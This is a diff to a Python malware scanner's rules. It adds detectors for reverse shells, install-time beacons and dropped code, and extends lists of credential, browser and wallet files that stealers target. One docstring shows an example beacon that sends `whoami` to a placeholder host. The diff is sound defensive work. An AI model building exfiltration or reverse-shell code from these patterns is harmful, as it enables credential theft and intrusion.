@@ -23,7 +23,7 @@ from .content_rules import (R_AGENT_BYPASS, R_AGENT_CFG_WRITE, R_AI_ADDRESSED, R
                             R_FAKE_PROMPT, R_HIDDEN_COMMENT, R_ATTACK_TOOL, R_INLINE_NET, R_LOG_WIPE, R_LOLBIN, R_LONG_LINE, R_NET_AUTO,
                             R_OBFUSCATED, R_PAD_LINES, R_PAD_SPACES, R_PERSIST, R_QUARANTINE, R_REGISTRY,
                             R_REVERSE_SHELL, R_SECRETS, R_SELECTORS, R_SELF_PUBLISH, R_SWEEP, R_TAGS, R_TERMINAL, R_URL_INSTALL, R_ZERO_WIDTH)
-from .deobfuscate import (DEOBF_HINT, FOLD_LIMIT, SPLIT_HINT, decoded_items, deobfuscate, is_sensitive,
+from .deobfuscate import (_DOC_HOST, DEOBF_HINT, FOLD_LIMIT, SPLIT_HINT, decoded_items, deobfuscate, is_sensitive,
                           needed_decoding, placeholder_url)
 from .hosts import URL, classify_host, host_kind, host_of
 from .indicators import EXFIL_HOSTS, RAW_IP_URL, SECRET_PATHS, WRITE_OP, is_private_ip  # noqa: F401
@@ -256,7 +256,7 @@ SECRET_NEED = (".ssh", "id_rsa", "id_ed25519", "id_ecdsa", ".aws", "gcloud", "ap
                ".docker", ".git-credentials", ".netrc", "hosts.yml", ".pypirc", ".claude", ".codex", ".gemini", "openclaw",
                ".cline", ".continue", "state.vscdb", ".copilot", "github-copilot", "login data", "cookies", "local state",
                "web data", "key3.db", "key4.db", "logins.json", "wallet.dat", "exodus", "electrum", "nkbihfbeogaeaoehlefnkodbefgpgknn",
-               "bfnaelmomeimhlpmgjnjophhpkkoljpa", "keychain")
+               "bfnaelmomeimhlpmgjnjophhpkkoljpa", "keychain", "leveldb", "tdata")
 ENV_NEED = ("process.env", "os.environ", "printenv", "env", "getenvironmentvariables")
 NET_NEED = ("fetch", "axios", "got", "needle", "superagent", "http", "require(", "from ", "net.", "dns.", "websocket",
             "xmlhttprequest", "requests.", "urllib", "urlopen", "socket.", "httpx", "aiohttp", "curl", "wget", "nslookup", "dig ",
@@ -456,11 +456,13 @@ def _agent_loaded(path: str) -> bool:
 
 
 def _code_host_install(snippet: str) -> bool:
-    """Every URL or shorthand the install line uses is HTTPS on a public code host."""
-    urls_ = re.findall(r"(?:git\+)?(https?)://([^/\s'\"#@]+)", snippet)
+    """Every URL or shorthand the install line uses is a public code host, over HTTPS or the SSH and git transports
+    (`git+ssh://git@github.com/...`): the project's own source repository, as a README points at it."""
+    urls_ = re.findall(r"(?:git\+)?(https?|ssh|git)://(?:[\w.-]+@)?([^/\s'\"#@:]+)", snippet)
+    scp = re.findall(r"\bgit@([\w.-]+):", snippet)
     short = re.findall(r"\b(github|gitlab|bitbucket):", snippet)
-    return bool(urls_ or short) and all(scheme == "https" and host.lower().split(":")[0] in _CODE_HOSTS
-                                        for scheme, host in urls_)
+    return bool(urls_ or scp or short) and all(scheme in ("https", "ssh", "git") and host.lower() in _CODE_HOSTS
+                                               for scheme, host in urls_) and all(h.lower() in _CODE_HOSTS for h in scp)
 
 
 _FETCH_NEAR = re.compile(r"\b(?:https?|ftp)://|\b(?:curl|wget|iwr|Invoke-WebRequest|DownloadFile|DownloadString|"
@@ -546,15 +548,21 @@ def analyze_command(command: str, path: str, line: int = 0, context: str = "auto
     m = AGENT_CONFIG.search(command) if has(low, AGENT_NEED) else None
     if m and WRITE_OP.search(command):
         sev = AGENT_CFG_SEV.get(ctx) or "medium"
+        note = ""
         if ctx == "doc" and re.match(r"(?i)\.git[\\/]hooks|core\.hooksPath", m.group()):
             sev = "low"  # contributor guides install git hooks; agent settings are what instruction files must not touch
-        col.add(R_AGENT_CFG_WRITE, sev, m.start(), "changes agent configuration " + m.group(), context)
+        elif m.group().lower() == "core.hookspath" and _IN_PROJECT_HOOKS.match(command, m.end()):
+            # what hook managers (husky, simple-git-hooks) do: the hooks are the project's own files, read as code
+            sev, note = "low", " to a folder inside the project"
+        col.add(R_AGENT_CFG_WRITE, sev, m.start(), "changes agent configuration " + m.group() + note, context)
     m = PERSIST.search(command) if has(low, PERSIST_NEED) else None
     if m:
         col.add(R_PERSIST, PERSIST_SEV.get(ctx) or "medium", m.start(), "sets up persistence", context)
     if has(low, ENV_NEED) and ENV_DUMP.search(command) and NETWORK.search(command):
         col.add(R_EXFIL, "critical" if ctx == "autoexec" else "high", 0, "collects the environment and sends it",
                 context)
+    if ctx == "autoexec":
+        _shell_beacon(col, command, context)
     for blob in decode_blobs(command):
         col.items.extend(analyze_command(blob["text"], path, line, context, note=f"decoded {blob['kind']}: ",
                                          _depth=_depth + 1))
@@ -613,7 +621,20 @@ def _registry(col: Collector, text: str, context: str, low: str | None = None) -
                "code": "medium", "config": "high"}.get(context_sev, "high")
         if context_sev in ("code", "autoexec") and not col.command and data_string(text, m.start(), col.path, context_sev):
             sev = "low"
-        col.add(R_REGISTRY, sev, m.start(), f"package source set to {host_of(target) or target}", context)
+        host = (host_of(target) or "").lower()
+        note = ""
+        if _DOC_HOST.fullmatch(host):
+            sev, note = "low", " (a documentation domain)"  # example.com serves no packages
+        elif context_sev == "doc" and _PUBLIC_MIRRORS.search(host) and not _agent_loaded(col.path):
+            sev, note = "low", " (a public mirror of PyPI, in documentation)"
+        col.add(R_REGISTRY, sev, m.start(), f"package source set to {host or target}{note}", context)
+
+
+# Public mirrors of the Python Package Index that READMEs name for readers in regions where pypi.org is slow, and
+# Anaconda's index of nightly scientific wheels.
+_PUBLIC_MIRRORS = re.compile(r"(?:^|\.)(?:mirror\.baidu\.com|mirrors\.aliyun\.com|pypi\.tuna\.tsinghua\.edu\.cn|"
+                             r"mirrors\.tuna\.tsinghua\.edu\.cn|pypi\.mirrors\.ustc\.edu\.cn|mirrors\.cloud\.tencent\.com|"
+                             r"repo\.huaweicloud\.com|pypi\.douban\.com|pypi\.anaconda\.org)$")
 
 
 def _exfil_hosts(col: Collector, text: str, context: str, low: str | None = None) -> None:
@@ -645,7 +666,8 @@ _SECRET_KINDS = (("ssh", (".ssh", "id_rsa", "id_ed25519", "id_ecdsa")), ("aws", 
                                                         "state.vscdb", ".copilot", "github-copilot")),
                  ("browser", ("login data", "cookies", "local state", "web data", "key3.db", "key4.db", "logins.json")),
                  ("wallet", ("wallet.dat", "exodus", "electrum", "nkbihfbeogaeaoehlefnkodbefgpgknn",
-                             "bfnaelmomeimhlpmgjnjophhpkkoljpa")), ("keychain", ("keychain",)))
+                             "bfnaelmomeimhlpmgjnjophhpkkoljpa")), ("keychain", ("keychain",)),
+                 ("messaging", ("leveldb", "tdata")))
 
 
 _OPEN_QUOTES = "\"'`\u201c\u2018\u00ab"
@@ -667,7 +689,8 @@ def _secret_kinds(matches) -> set[str]:
     return kinds
 
 
-FUNCTION_ALIAS = re.compile(r"\.constructor\s*\.\s*constructor\b(?!\s*\(\s*['\"]return this)"
+# (?![-.\w]): not a dotted name that goes on, like the grammar scope keyword.other.constructor.constructor-type
+FUNCTION_ALIAS = re.compile(r"\.constructor\s*\.\s*constructor\b(?![-.\w])(?!\s*\(\s*['\"]return this)"
                             r"|\.constructor\s*\[\s*['\"]constructor['\"]\s*\]|\bFunction\.prototype\.constructor\b"
                             r"|\bReflect\.construct\s*\(\s*Function\b")
 
@@ -689,11 +712,104 @@ _NPM_PUBLISH = re.compile(r"\b(?:exec|execSync|spawn|spawnSync|execFile|execFile
 _PKG_WRITE = re.compile(r"writeFile(?:Sync)?\s*\(\s*[^,\n]{0,120}package\.json")
 
 
+# The user or machine name taken in a shell: a command substitution, or the variables shells and Windows set. Not
+# `uname -a`: installers (nvm, the Maven wrapper) read it to tell the operating system, and only -n is the name alone.
+SHELL_IDENTITY = re.compile(r"\$\(\s*(?:whoami|hostname|id\s+-u\s*-n|id\s+-un|uname\s+-n)\s*\)|`\s*(?:whoami|hostname|"
+                            r"id\s+-un|uname\s+-n)\s*`|\$\{?(?:USER|USERNAME|LOGNAME|HOSTNAME)\}?(?!\w)|"
+                            r"%(?:USERNAME|COMPUTERNAME|USERDOMAIN)%|\$env:(?:USERNAME|COMPUTERNAME)\b")
+# A network command whose arguments carry a variable or a substitution: the address or the data is built at run time.
+SHELL_SEND = re.compile(r"(?<![\w-])(?:curl|wget|nslookup|dig|ping|host|nc|ncat)\s[^\n;|&]{0,300}?(?:\$\{?\w|\$\(|`|"
+                        r"%\w+%)|\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\s[^\n;|&]{0,300}?\$\w")
+_SHELL_SPAWN = re.compile(r"\bsubprocess\.\w+\s*\(|\bpty\.spawn\s*\(|\bos\.(?:exec\w*|system|popen)\s*\(|"
+                          r"['\"](?:/bin/(?:ba|z|da)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)['\"]")
+_PY_CONNECT = re.compile(r"\.connect\s*\(\s*\(")
+_PY_DUP2 = re.compile(r"\bdup2\s*\(\s*[\w.]+\.fileno\s*\(\s*\)")
+_JS_SOCKET = re.compile(r"\bnet\.(?:Socket|connect|createConnection)\b|\bnew\s+(?:net\.)?Socket\s*\(")
+_JS_SHELL = re.compile(r"\b(?:spawn|exec)\w*\s*\(\s*['\"](?:/bin/(?:ba|z)?sh|sh|bash|cmd(?:\.exe)?|"
+                       r"powershell(?:\.exe)?)['\"]")
+
+
+_INSTALL_HOOK = re.compile(r"\bcmdclass\s*=|\bclass\s+\w+\s*\(\s*(?:[\w.]+\.)?(?:install|develop|egg_info|build_py|sdist|"
+                           r"bdist_wheel)\s*\)")
+
+
+# A string literal written to a file, then the file handed to a call: a dropper's second stage, held as a string.
+_WRITE_LITERAL = re.compile(r"\b(?P<obj>[A-Za-z_]\w*)\.write(?:_text|_bytes)?\s*\(\s*[rbuRBU]{0,2}(?P<q>\"\"\"|'''|\"|')"
+                            r"(?P<body>.{20,}?)(?P=q)\s*[,)]", re.S)
+_CODE_HINT = re.compile(r"\bimport\s+\w|\bexec\s*\(|\beval\s*\(|\burlopen\b|\brequests\.|\bsubprocess\b|\bos\.system\b")
+
+
+def _passes_written_file(text: str, obj: str, start: int) -> bool:
+    """After the write, a call receives the file: `run([sys.executable, f.name])`, `system(f"start {x} {t.name}")`,
+    or the path the file was opened from."""
+    names = [re.escape(obj) + r"\.name\b"]
+    opened = re.search(rf"(?:\b{re.escape(obj)}\s*=\s*open\s*\(\s*([\w.]+)|\bopen\s*\(\s*([\w.]+)[^)\n]*\)\s+as\s+"
+                       rf"{re.escape(obj)}\b)", text[:start])
+    if opened:
+        names.append(r"\b" + re.escape(opened.group(1) or opened.group(2)) + r"\b")
+    return bool(re.search(rf"[\w.]+\s*\([^\n]{{0,200}}?(?:{'|'.join(names)})", text[start:start + 3000]))
+
+
+def _dropped_code(col: Collector, text: str, path: str, context: str) -> None:
+    """Python that writes code held in a string to a file and then hands that file to a call (the interpreter, a
+    shell, os.startfile): the string is judged as code in the same context, so what it does decides the verdict. A
+    helper script that a build tool writes and runs does nothing risky and stays clean."""
+    for m in _WRITE_LITERAL.finditer(text):
+        body = m.group("body")
+        if _CODE_HINT.search(body) and _passes_written_file(text, m.group("obj"), m.end()):
+            line = col.offset + col.lines.line(m.start("body")) - 1
+            for f in scan_text(body, path, context, structural=False, line_offset=line,
+                               note=col.note + "code it writes to a file and runs: "):
+                col.items.append(f)
+            return
+
+
+# core.hooksPath set to a relative folder that stays in the project (.githooks, .husky/_), not an outside path.
+_IN_PROJECT_HOOKS = re.compile(r"\s+['\"]?(?![/~\\$%]|[A-Za-z]:|\.\.)[\w.-]+(?:/[\w.-]+)*['\"]?(?=\s|$|[;&|)])")
+
+
+def _shell_beacon(col: Collector, text: str, context: str) -> None:
+    """Install-time shell code that takes the user or machine name and runs a network command built from variables:
+    `curl http://$(whoami).example.invalid`, or the name hex-encoded into a variable first and sent as a subdomain."""
+    if not has(text.lower(), ("curl", "wget", "nslookup", "dig ", "ping", "host ", "nc ", "ncat", "invoke-", "iwr", "irm")):
+        return
+    # The name goes into the request a few statements later; in a long script an error message that prints
+    # `whoami` and a download near the top have nothing to do with each other (nvm.sh).
+    sends = [m for m in SHELL_SEND.finditer(text)][:200]
+    for who in list(SHELL_IDENTITY.finditer(text))[:50]:
+        send = next((m for m in sends if -300 <= m.start() - who.start() <= 1500), None)
+        if send:
+            col.add(R_EXFIL, "high", send.start(), f"takes the user or machine name ({who.group().strip()}) and runs a "
+                    "network command built from variables while installing", context)
+            return
+
+
+def _reverse_shell(col: Collector, text: str, path: str, context: str, live) -> None:
+    """A reverse shell written over several statements: a socket connected out, then wired to a shell's input and
+    output (Python: os.dup2 of the socket onto stdin and stdout; Node: the socket piped into a spawned shell)."""
+    sev = "critical" if context == "autoexec" else "high"
+    if path.lower().endswith((".py", ".pyw")):
+        dup = next(iter(live(_PY_DUP2.finditer(text), 1)), None)
+        if dup and _PY_CONNECT.search(text) and _SHELL_SPAWN.search(text):
+            col.add(R_REVERSE_SHELL, sev, dup.start(), "connects a socket out and hands it a shell's input and output",
+                    context)
+    elif path.lower().endswith((".js", ".cjs", ".mjs")):
+        shell = next(iter(live(_JS_SHELL.finditer(text), 1)), None)
+        if shell and _JS_SOCKET.search(text) and re.search(r"\.pipe\s*\(", text):
+            col.add(R_REVERSE_SHELL, sev, shell.start(), "connects a socket out and pipes it to a shell", context)
+
+
 def _two_step_shapes(col: Collector, text: str, path: str, context: str, low: str, nets: list[int], live) -> None:
     """Shapes whose evidence sits in two statements: data decoded into a variable and then run, host details taken
     and a network call made while installing, a program downloaded, saved and run, and a package that rewrites its
     package.json and publishes itself."""
     auto = context == "autoexec"
+    if auto:
+        _shell_beacon(col, text, context)
+    if has(low, ("dup2", "socket")):
+        _reverse_shell(col, text, path, context, live)
+    if path.lower().endswith((".py", ".pyw")) and ".write" in text:
+        _dropped_code(col, text, path, context)
     for m in live(_STAGED.finditer(text), 20) if has(low, ("decode", "decompress", "unhexlify", "fromhex", "decrypt",
                                                           "base64", "atob")) else ():
         name = re.escape(m.group(1))
@@ -792,7 +908,11 @@ def scan_text(text: str, path: str, context: str, *, decode: bool = True, struct
             col.add(R_EXFIL, "high", sends[0].start(), "sends data out while installing or opening (to an address "
                     "assembled at run time)", context)
         else:
-            col.add(R_NET_AUTO, "low", nets[0], "network call in code that runs automatically", context)
+            # A setup.py that replaces pip's own install steps and talks to the network: popular packages do not
+            # (none of 2,000 sampled); install-time stealers and reverse shells do.
+            hook = path.lower().endswith("setup.py") and _INSTALL_HOOK.search(text)
+            col.add(R_NET_AUTO, "medium" if hook else "low", nets[0], "network call in code that runs automatically"
+                    + (", from a setup.py that replaces pip's install steps" if hook else ""), context)
     if is_code:
         _two_step_shapes(col, text, path, context, low, nets, live)
     for m in DOWNLOAD_THEN_RUN.finditer(text) if context in ("autoexec", "code") and has(low, ("curl", "wget")) else ():
@@ -952,8 +1072,8 @@ def _strings_in_test(text: str, path: str, context: str, item: dict) -> bool:
     return context == "code" and is_test_code(path) and all(in_string_literal(text, p) for p in item.get("positions", [item["pos"]]))
 
 
-BUNDLED = re.compile(r"(?:\.min\.|[-.]bundle\.|\.browser\.|\.umd\.|[\\/](?:dist|build|vendor|umd|bundles?|assets|static|chunks|_next|"
-                     r"locales?|i18n|l10n)[\\/])", re.I)
+BUNDLED = re.compile(r"(?:\.min\.|[-.]bundle\.|\.browser\.|\.umd\.|(?:^|[\\/])(?:dist|build|vendor|umd|bundles?|assets|static|"
+                     r"chunks|_next|locales?|i18n|l10n)[\\/])", re.I)
 
 
 def _strings_in_bundle(text: str, path: str, context: str, item: dict) -> bool:
@@ -967,8 +1087,47 @@ _ZW_RUN = re.compile("[​‌‍⁠-⁤﻿]{8,}")
 
 
 def _long_run(text: str, item: dict) -> bool:
-    """Eight or more zero-width characters in a row: data spelled out in invisible characters, not text."""
-    return bool(_ZW_RUN.search(text))
+    """Eight or more zero-width characters in a row that repeat: data spelled out in invisible characters, not text.
+    A run where each character appears once is a set of them (a grammar's identifier class), and carries nothing."""
+    return any(len(set(m.group())) < len(m.group()) for m in _ZW_RUN.finditer(text))
+
+
+_TABLE_HINT = re.compile(r"\\u\{?[0-9A-Fa-f]{4,6}\}?|\\x[0-9A-Fa-f]{2}|[^\x00-\x7f]-[^\x00-\x7f]")
+_QUOTES = "\"'`"
+
+
+def _char_table(text: str, item: dict, path: str = "") -> bool:
+    """Every occurrence sits in a table of characters: inside a string next to escapes of other characters or ranges
+    of non-ASCII letters (a whitespace set, an identifier class in a grammar), or alone in its own string or on its
+    own line (a list of named symbols, a dictionary of characters). Text-handling code carries these. Not outside
+    strings, where these characters deceive (in names); and a payload spelled out in invisible characters needs a long
+    run of them, which is checked separately."""
+    for p in item.get("positions", [item["pos"]]):
+        before, after = text[p - 1:p], text[p + 1:p + 2]
+        if (before and after and before in _QUOTES and after in _QUOTES) or (before in ("\n", "") and after in
+                                                                              ("\n", "\r", "")):
+            continue
+        # In a bundle the strings of a minified line cannot be parsed reliably, and names there deceive nobody.
+        in_string = in_string_literal(text, p) or _in_char_class(text, p) or bool(BUNDLED.search(path))
+        if not (in_string and _TABLE_HINT.search(text, max(0, p - 60), p + 60)):
+            return False
+    return True
+
+
+def _in_char_class(text: str, p: int) -> bool:
+    """Inside a bracketed character class on its line, `[...]` of a regular expression or a pattern string."""
+    open_at = text.rfind("[", max(0, p - 300), p)
+    close_at = text.find("]", p, p + 300)
+    return open_at >= 0 and close_at >= 0 and "]" not in text[open_at + 1:p] and "\n" not in text[open_at:close_at]
+
+
+_DATA_EXT = (".json", ".jsonl", ".txt", ".csv", ".tsv", ".xml", ".yaml", ".yml", ".html", ".htm", ".dat", ".dic")
+
+
+def _test_data(path: str) -> bool:
+    """A data file in a test folder: inputs for text-handling tests, read by tests and nothing else."""
+    return path.lower().endswith(_DATA_EXT) and bool(re.search(r"(?:^|/)(?:tests?|testing|testdata|test[-_]data)/", path,
+                                                              re.I))
 
 
 def _structural(col: Collector, text: str, path: str, context: str) -> None:
@@ -989,23 +1148,34 @@ def _structural(col: Collector, text: str, path: str, context: str) -> None:
             sev = "high" if item["count"] >= 4 else "medium"
             if is_code and item["count"] >= 4:
                 sev = "critical" if context == "autoexec" else "high"
-            col.add(R_SELECTORS, sev, pos, f"{item['count']} variation selectors decode to: {item['decoded'][:160]!r}",
-                    context)
+            note = ""
+            if _test_data(path) and item["count"] < 8:  # Unicode test cases; a payload this short is not one
+                sev, note = "low", " (in a test data file)"
+            col.add(R_SELECTORS, sev, pos, f"{item['count']} variation selectors decode to: {item['decoded'][:160]!r}"
+                    f"{note}", context)
         elif kind == "bidi":
             sev = "high" if is_code else ("medium" if context in ("doc", "config") else "low")
             note = ""
             if _strings_in_test(text, path, context, item):
                 sev, note = "low", " (inside string literals in a test file)"
+            elif _test_data(path):
+                sev, note = "low", " (in a test data file)"
             elif _strings_in_bundle(text, path, context, item):
                 sev, note = "low", " (inside strings in a bundled file)"
+            elif _char_table(text, item, path):
+                sev, note = "low", " (in a table of characters)"
             col.add(R_BIDI, sev, pos, f"{item['count']} bidirectional control characters{note}", context)
         elif kind == "zero-width":
             sev = ("medium" if item["count"] < 10 else "high") if is_code else "low"
             note = ""
             if _strings_in_test(text, path, context, item):
                 sev, note = "low", " (inside string literals in a test file)"
+            elif _test_data(path) and not _long_run(text, item):
+                sev, note = "low", " (in a test data file)"
             elif _strings_in_bundle(text, path, context, item) and not _long_run(text, item):
                 sev, note = "low", " (inside strings in a bundled file)"
+            elif not _long_run(text, item) and _char_table(text, item, path):
+                sev, note = "low", " (in a table of characters)"
             elif is_code and item["count"] < 10 and not _long_run(text, item) and all(
                     in_string_literal(text, p) for p in item.get("positions", [pos])):
                 # A few inside strings are text-handling constants (strip or split on them); deception is in names
@@ -1018,6 +1188,8 @@ def _structural(col: Collector, text: str, path: str, context: str) -> None:
             spots = {"pos": pos, "positions": [m.start() for m in FILLERS.finditer(text)][:200]}
             if _strings_in_test(text, path, context, spots) or _strings_in_bundle(text, path, context, spots):
                 sev, note = "low", " (inside strings in a test or bundled file)"
+            elif _test_data(path) or _char_table(text, spots, path):
+                sev, note = "low", " (a character in a list or table)"
             col.add(R_ZERO_WIDTH, sev, pos, f"{item['count']} Hangul filler characters (invisible identifiers){note}",
                     context)
     if "\x1b" in text:
@@ -1027,6 +1199,8 @@ def _structural(col: Collector, text: str, path: str, context: str) -> None:
             note = ""
             if context == "code" and is_test_code(path):
                 sev, note = "low", " (in a test file)"
+            elif path.lower().endswith((".pdf", ".ps", ".eps")) or _test_data(path):
+                sev, note = "low", " (in a binary document or test data, which no terminal prints raw)"
             col.add(R_TERMINAL, sev, hides[0].start(), f"{len(hides)} escape codes that conceal, erase or overwrite "
                     f"text{note}", context)
     for item in padding(text, doc=context == "doc"):
@@ -1039,13 +1213,15 @@ def _structural(col: Collector, text: str, path: str, context: str) -> None:
             if context == "code" and is_test_code(path) and in_string_literal(text, item["pos"]):
                 sev, note = "low", " (inside a string literal in a test file)"
             col.add(R_PAD_SPACES, sev, item["pos"], f"code after {item['count']:,} spaces{note}", context)
-    minified = bool(re.search(r"(?:\.min\.|[\\/](?:dist|build|vendor|umd|bundles?)[\\/])", path, re.I))
+    minified = bool(re.search(r"(?:\.min\.|(?:^|[\\/])(?:dist|build|vendor|umd|bundles?)[\\/])", path, re.I)
+                    or BUNDLED.search(path))
     data_file = path.lower().endswith((".map", ".json", ".geojson", ".ndjson", ".jsonl", ".csv", ".tsv", ".svg"))
     for pos, length in long_lines(text, 5000):
         if data_file and context != "autoexec":
             sev = "low"  # source maps, JSON and tables are data: one long line is how they are written
         elif length >= 1_000_000:
-            sev = "high" if context == "autoexec" else "medium"
+            # a minified bundle (swagger-ui, a vendored library) is one line; its content is read whole regardless
+            sev = "high" if context == "autoexec" else ("low" if minified else "medium")
         elif length >= 100_000 and not minified:
             sev = "medium" if context == "autoexec" else "low"
         else:
